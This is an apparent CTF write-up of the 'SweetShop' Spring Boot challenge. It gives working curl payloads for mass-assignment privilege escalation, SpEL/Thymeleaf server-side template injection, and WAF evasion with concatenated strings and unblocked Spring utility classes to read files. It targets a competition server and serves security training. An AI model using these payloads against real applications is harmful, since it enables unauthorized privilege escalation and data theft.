<img width="573" height="418" alt="Screenshot 2026-03-08 151318" src="https://github.com/user-attachments/assets/dbf0cc68-8d20-49ed-a5a4-2210832ec167" />


challenge Description:** SweetShop is a seemingly simple e-commerce web application. However, under the hood, it's a Spring Boot application riddled with severe misconfigurations, leading to complete server compromise via Server-Side Template Injection (SSTI).

## 1. Initial Reconnaissance & Information Disclosure

The initial assessment of the web page revealed standard functionality: a product listing, registration, and login. However, inspecting the HTML source code yielded two critical clues:

1. A decoy flag in an HTML comment: ``
    
2. A developer note in the footer revealing the tech stack and a massive misconfiguration:
    

Navigating to `http://chals1.apoorvctf.xyz:7001/actuator/mappings` dumped the application's entire routing table. This exposed several hidden administrative endpoints:

- `/api/admin/flag`
    
- `/api/admin/preview` (mapped to a Thymeleaf template engine)
    

## 2. Exploiting Mass Assignment for Privilege Escalation

The registration endpoint `/api/register` accepted a JSON payload. Because Spring Boot often binds incoming JSON directly to internal Java Objects (like a `User` entity), we tested for Mass Assignment by injecting a `"role"` parameter into a standard registration request.

**Payload:**

Bash

```Bash

curl -s -X POST http://chals1.apoorvctf.xyz:7001/api/register \
-H "Content-Type: application/json" \
-d '{"username":"hunter_prasanna", "password":"password123", "email":"hunter@test.com", "role":"ADMIN"}' | jq
```

**Result:** The server responded with `"role": "ADMIN"`, confirming the mass assignment vulnerability. We successfully escalated our privileges upon account creation.

After logging in with the newly created admin credentials via `/api/login`, we extracted our `apiToken` (`53696179-29a9-4898-a6b7-b579554a0d90`).

## 3. API Interaction & The Decoy Flag

With the admin token in hand, we targeted the hidden `/api/admin/flag` endpoint discovered during recon. The server required a specific custom header, which it conveniently leaked in an error message (`"hint":"Use X-Api-Token header"`).

**Payload:**

Bash

```
curl -s -X GET http://chals1.apoorvctf.xyz:7001/api/admin/flag \
-H "X-Api-Token: 53696179-29a9-4898-a6b7-b579554a0d90"
```

**Result:** This returned `apoorvctf{y0u_f0und_th3_4dm1n_p4n3l}`, which was another fake flag. The real challenge lay deeper in the application.

## 4. Server-Side Template Injection (SSTI) & Distroless Discovery

We pivoted to the `/api/admin/preview` endpoint. Knowing the application used Thymeleaf, we tested for SSTI using a basic Spring Expression Language (SpEL) payload: `{"template": "Testing SSTI: ${7*7}"}`. The server evaluated the math, confirming the vulnerability.

Initial attempts to achieve Remote Code Execution (RCE) using `T(java.lang.Runtime).getRuntime().exec("ls -la")` were blocked by a Web Application Firewall (WAF).

Bypassing the WAF with `java.lang.ProcessBuilder` yielded a critical error: `EL1029E... Problem invoking method: public java.io.InputStream java.lang.ProcessImpl.getInputStream()`. This specific error indicates the application is running inside a **distroless Docker container**—meaning standard OS binaries like `/bin/sh`, `ls`, or `cat` do not exist.

## 5. Pure Java File Enumeration

Unable to rely on a shell, I used pure Java to interact with the container's filesystem. I successfully enumerated the directories using `java.io.File`, bypassing the WAF.

**Payload:**

Bash

```bash

curl -s -X POST http://chals1.apoorvctf.xyz:7001/api/admin/preview \
-H "Content-Type: application/json" \
-H "X-Api-Token: 53696179-29a9-4898-a6b7-b579554a0d90" \
-d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}' | jq
```

**Result:** The response revealed `[flag.txt, app.jar]`. The real flag was sitting in the `/app` directory.

## 6. The Final Exploit: Bypassing the WAF

The final hurdle was reading the `flag.txt` file. The WAF aggressively blacklisted standard file-reading classes, blocking:

- `java.util.Scanner`
    
- `java.nio.file.Files`
    
- `java.io.FileInputStream`
    
- `java.net.URL`
    
- Spring's `@applicationContext` and `@environment` beans.
    

To bypass this aggressive filtering, we leveraged the Spring Framework's own internal utility classes, which the WAF author failed to blacklist. We used `org.springframework.util.FileCopyUtils` combined with string concatenation (`"fl"+"ag.txt"`) to evade static keyword matching.

**Final Payload:**

Bash

```
curl -s -X POST http://chals1.apoorvctf.xyz:7001/api/admin/preview \
-H "Content-Type: application/json" \
-H "X-Api-Token: 53696179-29a9-4898-a6b7-b579554a0d90" \
-d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}' | jq
```

**Result:**

JSON

```json
{
  "note": "This is a preview of the notification template",
  "preview": "apoorvctf{sp3l_1nj3ct10n_sw33t_v1ct0ry_2026}\n"
}
```

**Flag:** `apoorvctf{sp3l_1nj3ct10n_sw33t_v1ct0ry_2026}`
